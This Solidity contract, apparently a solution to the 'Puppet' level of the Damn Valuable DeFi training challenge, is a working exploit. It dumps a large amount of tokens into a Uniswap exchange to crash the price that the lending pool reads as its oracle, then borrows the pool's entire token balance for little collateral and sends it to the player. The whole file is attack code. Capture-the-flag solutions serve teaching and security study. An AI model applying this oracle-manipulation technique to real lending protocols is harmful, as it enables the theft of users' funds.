// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface IUniswap {
    function tokenToEthSwapInput(uint256,uint256,uint256) external returns (uint256);
    function ethToTokenSwapInput(uint256 minTokens, uint256 deadline) external payable returns (uint256);

}

interface Pool {
    function borrow(uint256 amount, address recipient) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
}

contract PuppetExploit {
    Pool pool;
    IUniswap uni;
    DamnValuableToken token;
    address player;


    constructor(address _target1, address _target2, address _target3, address _target4) payable {
        pool = Pool(_target1);
        uni = IUniswap(_target2);
        token = DamnValuableToken(_target3);
        player = _target4;
    }

    function _addr() public view returns (address){
        return msg.sender;
    }

    function exploit() public{
        token.approve(address(uni), type(uint256).max);
        uni.tokenToEthSwapInput(1000 ether, 1, block.timestamp + 5000);
        pool.borrow{value: 20 ether}(token.balanceOf(address(pool)), player);
    }

    receive() external payable {}
}